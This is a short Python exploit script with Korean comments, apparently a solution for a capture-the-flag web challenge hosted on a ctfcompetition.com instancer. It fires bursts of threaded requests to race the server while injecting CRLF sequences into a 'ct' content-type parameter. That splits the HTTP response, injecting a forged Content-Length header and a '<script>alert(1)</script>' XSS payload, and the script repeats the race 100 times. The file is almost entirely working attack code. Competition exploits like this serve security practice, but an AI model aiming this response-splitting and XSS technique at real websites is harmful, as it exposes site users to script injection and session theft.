import threading
import requests
import urllib.parse
import time

TARGET = 'https://ukaliklr-lost-in-transliteration.instancer.2025.ctfcompetition.com/file'
FILENAME = 'script.js'

# Content-Type 조작 페이로드 생성
def build_payload1(i):
    injected_ct = f"text/html"
    encoded_ct = urllib.parse.quote(injected_ct)
    return f"{TARGET}?filename={FILENAME}&ct={encoded_ct}&q="

def build_payload2(i):
    injected_ct = f"text/html\r\nContent-Length:25\r\n\r\n<script>alert(1)</script>"
    encoded_ct = urllib.parse.quote(injected_ct)
    return f"{TARGET}?filename={FILENAME}&ct={encoded_ct}&q="

# 요청 전송 함수 (스레드용)
def send_request1(i):
    url = build_payload1(i)
    try:
        response = requests.get(url, timeout=3)
        # print(f"[{i}] Status: {response.status_code} Length: {len(response.text)}")
        # if "<script>alert(" in response.text:
        #     print(f"💥 XSS Payload Triggered in thread {i}!")
    except Exception as e:
        print(f"[{i}] Error: {e}")

def send_request2(i):
    url = build_payload2(i)
    try:
        response = requests.get(url, timeout=3)
        print(f"[{i}] Status: {response.status_code} Length: {len(response.text)}")
        if "<script>alert(" in response.text:
            print(f"💥 XSS Payload Triggered in thread {i}!")
    except Exception as e:
        print(f"[{i}] Error: {e}")

# 메인 스레드 실행 함수
def run_race():
    threads = []
    for i in range(7):
        t = threading.Thread(target=send_request1, args=(i,))
        threads.append(t)
        t.start()
        time.sleep(0.01)  # 아주 짧은 간격으로 시작하여 타이밍 겹침 유도
    for i in range(3):
        t = threading.Thread(target=send_request2, args=(i,))
        threads.append(t)
        t.start()
        time.sleep(0.01)  # 아주 짧은 간격으로 시작하여 타이밍 겹침 유도

    for t in threads:
        t.join()

# 반복 실행해서 레이스 컨디션 확률 증가
for attempt in range(100):
    print(f"\n🔁 Attempt {attempt}")
    run_race()
